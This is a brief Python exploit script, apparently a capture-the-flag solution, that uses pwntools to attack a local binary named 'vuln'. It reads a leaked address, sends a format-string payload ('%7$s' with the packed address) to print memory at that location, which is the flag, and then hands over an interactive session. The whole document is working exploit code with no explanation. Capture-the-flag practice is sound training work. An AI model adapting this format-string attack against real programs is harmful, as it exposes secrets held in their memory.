from pwn import *

io = process('./vuln')
#gdb.attach(io, api=True)

io.recvuntil(b'gift: ')
flag_address = io.recvline(keepends=False).decode()
flag = int(flag_address, 16)
payload = b'%7$s--' + p32(flag)
io.sendline(payload)
io.interactive()